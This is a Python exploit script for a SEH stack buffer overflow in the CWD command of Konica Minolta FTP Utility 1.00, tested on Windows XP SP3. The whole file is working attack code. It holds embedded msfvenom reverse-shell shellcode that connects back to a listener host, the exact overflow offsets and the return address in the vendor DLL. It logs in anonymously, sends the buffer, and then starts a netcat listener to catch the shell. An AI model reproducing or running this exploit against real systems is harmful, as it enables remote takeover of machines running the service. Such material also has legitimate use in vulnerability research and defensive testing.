#!/usr/bin/env python
import sys
import socket
import struct
import subprocess

#----------------------------------------------------------------------------------#
# Exploit: Konica Minolta FTP Utility 1.00 CWD Command SEH Stack Buffer Overflow   #
# OS Tested: XP PRO SP3 (Professional)                                             #
# Author: Amonsec                                                                  #
# Software: https://www.exploit-db.com/apps/                                       #
#                   6388a2ae7dd2965225b3c8fad62f2b3b-ftpu_10.zip                   #
#----------------------------------------------------------------------------------#

if len(sys.argv) < 2:
	print '[*] Konica Minolta FTP Utility 1.00 Fuzzer'
	print '[*] Usage: {} <ip addr>'.format(sys.argv[0])
	sys.exit(1)
else:
	rhost = sys.argv[1]

#------------------------------------------------------------------------------------------------------------------------------------#
# msfvenom --platform windows -p windows/shell_reverse_tcp LPORT=31337 LHOST=192.168.94.128 -a x86 -f python -v shellcode -b '\x00'  #
#------------------------------------------------------------------------------------------------------------------------------------#
shellcode =  ""
shellcode += "\xb8\x77\xdc\x5c\x6d\xd9\xc1\xd9\x74\x24\xf4\x5b"
shellcode += "\x31\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\x34"
shellcode += "\xd2\xbe\x98\x46\x02\xbc\x63\xb6\xd3\xa1\xea\x53"
shellcode += "\xe2\xe1\x89\x10\x55\xd2\xda\x74\x5a\x99\x8f\x6c"
shellcode += "\xe9\xef\x07\x83\x5a\x45\x7e\xaa\x5b\xf6\x42\xad"
shellcode += "\xdf\x05\x97\x0d\xe1\xc5\xea\x4c\x26\x3b\x06\x1c"
shellcode += "\xff\x37\xb5\xb0\x74\x0d\x06\x3b\xc6\x83\x0e\xd8"
shellcode += "\x9f\xa2\x3f\x4f\xab\xfc\x9f\x6e\x78\x75\x96\x68"
shellcode += "\x9d\xb0\x60\x03\x55\x4e\x73\xc5\xa7\xaf\xd8\x28"
shellcode += "\x08\x42\x20\x6d\xaf\xbd\x57\x87\xd3\x40\x60\x5c"
shellcode += "\xa9\x9e\xe5\x46\x09\x54\x5d\xa2\xab\xb9\x38\x21"
shellcode += "\xa7\x76\x4e\x6d\xa4\x89\x83\x06\xd0\x02\x22\xc8"
shellcode += "\x50\x50\x01\xcc\x39\x02\x28\x55\xe4\xe5\x55\x85"
shellcode += "\x47\x59\xf0\xce\x6a\x8e\x89\x8d\xe2\x63\xa0\x2d"
shellcode += "\xf3\xeb\xb3\x5e\xc1\xb4\x6f\xc8\x69\x3c\xb6\x0f"
shellcode += "\x8d\x17\x0e\x9f\x70\x98\x6f\xb6\xb6\xcc\x3f\xa0"
shellcode += "\x1f\x6d\xd4\x30\x9f\xb8\x7b\x60\x0f\x13\x3c\xd0"
shellcode += "\xef\xc3\xd4\x3a\xe0\x3c\xc4\x45\x2a\x55\x6f\xbc"
shellcode += "\xbd\x9a\xd8\xe0\xbd\x73\x1b\x1c\xc4\xea\x92\xfa"
shellcode += "\x52\xfd\xf2\x55\xcb\x64\x5f\x2d\x6a\x68\x75\x48"
shellcode += "\xac\xe2\x7a\xad\x63\x03\xf6\xbd\x14\xe3\x4d\x9f"
shellcode += "\xb3\xfc\x7b\xb7\x58\x6e\xe0\x47\x16\x93\xbf\x10"
shellcode += "\x7f\x65\xb6\xf4\x6d\xdc\x60\xea\x6f\xb8\x4b\xae"
shellcode += "\xab\x79\x55\x2f\x39\xc5\x71\x3f\x87\xc6\x3d\x6b"
shellcode += "\x57\x91\xeb\xc5\x11\x4b\x5a\xbf\xcb\x20\x34\x57"
shellcode += "\x8d\x0a\x87\x21\x92\x46\x71\xcd\x23\x3f\xc4\xf2"
shellcode += "\x8c\xd7\xc0\x8b\xf0\x47\x2e\x46\xb1\x78\x65\xca"
shellcode += "\x90\x10\x20\x9f\xa0\x7c\xd3\x4a\xe6\x78\x50\x7e"
shellcode += "\x97\x7e\x48\x0b\x92\x3b\xce\xe0\xee\x54\xbb\x06"
shellcode += "\x5c\x54\xee"

#----------------------------------------------------------------------------------#
# (*) Badchars = '\x00'                                                            #
#                                                                                  #
# (1) Crash to nseh 1037-bytes                                                     #
# (2) nshe = '\xeb\x08\x90\x90'                                                    #
# (3) seh = '\x1e\x40\x20\x12'	pop pop ret | [KMFtpCM.dll]                        #
# (4) shellcode space = 1350                                                       #
#----------------------------------------------------------------------------------#
# SEH Exploit Structure:                                                           #
#                                    \---------------->                            #
#     [AAA..................AAA]   [nseh]   [seh]   [BBB..................BBB]     #
#     \-------------------------------------->                                     #
#                                     <-------/                                    #
#----------------------------------------------------------------------------------#
buffer = ''
buffer += '\x41' * 1037
buffer += '\xeb\x08\x90\x90'
buffer += struct.pack('<L', 0x1220401e)
buffer += '\x90' * 30
buffer += shellcode
buffer += '\x44' * (1300 - 1037 - 8 - 30 - len(shellcode))

try:
	print '[*] Konica Minolta FTP Utility 1.00 CWD Command SEH Stack Buffer Overflow'
	print '[*] Trying to connect to target'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((rhost, 21))
	
	print '[*] Trying to exploit the CWD command'
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS \r\n')
	s.recv(1024)

	print "[*] Send:  %s bytes" % len(buffer)
	s.send('CWD {}\r\n'.format(buffer))
	s.close()

	print '[*] Brrraaaaaaah! A wild shell appears\n'
	subprocess.call(['nc -lnvp 31337'], shell=True)
except socket.error:
	print '[-] Exploit failed!'
